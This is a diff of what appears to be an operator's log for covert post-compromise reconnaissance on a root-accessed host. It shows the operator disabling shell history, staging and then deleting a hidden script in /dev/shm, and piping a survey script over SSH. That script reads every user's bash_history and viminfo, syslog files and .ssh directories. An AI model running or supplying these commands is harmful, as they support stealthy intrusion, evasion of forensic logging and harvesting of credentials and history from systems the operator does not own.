@@ -21,11 +21,11 @@ ssh -o ControlPath=/tmp/hop-1 root@1.1.1.1
 
 unset HISTFILE HISTFILESIZE HISTSIZE 
 export LESSHISTFILE=/dev/null
-scp -o ControlPath=/tmp/hop-1 /cline_101117_op1/survey.sh root@1.1.1.1:/dev/shm/.a
+scp -o ControlPath=/tmp/hop-1 /cline_101117_op1/mando.sh root@1.1.1.1:/dev/shm/.a
 source /dev/shm/.a
 rm -f /dev/shm/.a
 
-Ran the following mando commands in script survey.sh
+Ran the following mando commands in script mando.sh
 date; date -u
 ps -elf
 netstat -natup || ss -natup
@@ -45,7 +45,7 @@ cat /home/*/.bash_history
 cat /root/.viminfo
 cat /home/*/.viminfo
 
-
+cat ./survey.sh | ssh -o ControlPath=/tmp/hop-1 root@1.1.1.1 | survey-<ip>
 
 Ran the following commands in survey.sh script
 cat /etc/*syslog*
@@ -66,7 +66,7 @@ ls -latr /root/.ssh
 ls -latr /home/*/.ssh
 
 
-Ran the following exit commands in script survey.sh
+Ran the following exit commands in script mando.sh
 ps -elf
 netstat -lptn
 find / -type f -mmin -120 | egrep -v '\/sys|\/proc' 2>/dev/null
